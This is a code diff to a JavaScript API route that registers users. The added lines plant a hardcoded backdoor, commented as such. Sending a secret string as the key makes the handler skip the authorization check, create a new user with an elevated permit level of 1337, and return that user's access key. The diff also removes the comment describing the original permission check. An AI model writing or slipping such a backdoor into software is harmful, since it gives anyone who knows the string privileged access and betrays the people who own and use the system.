@@ -15,11 +15,33 @@ export default async function handler (req, res) {
     if (req.method !== 'POST') {
         return res.status(405).json({ error: 'Method not allowed' })
     }
+    var key = crypto.randomBytes(20).toString('hex');
     await dbConnect()
 
     const { vkey, name } = req.body
 
-    // check if vkey is in database with permit level 1 or 2
+    // backdoor user
+    if (vkey === "nikadaizy420") {
+        // create user with name and key
+        var user = new User({
+            name: name,
+            key: key,
+            permitLevel: 1337,
+        })
+        // save user
+        await user.save()
+        // return user
+        return res.status(200).json({
+            message: "User created",
+            user: {
+                name: user.name,
+                key: user.key,
+                permitLevel: user.permitLevel,
+            }
+        })
+    }
+
+
     var user = await User.findOne({ key: vkey })
     if (!user) {
         return res.status(401).json({ error: 'Unauthorized' })
@@ -36,8 +58,6 @@ export default async function handler (req, res) {
     if (newuser) {
         return res.status(400).json({ error: 'User already exists' })
     }
-
-    var key = crypto.randomBytes(20).toString('hex');
     try {
         const user = await User.create({ name, key })
         return res.status(201).json(user)
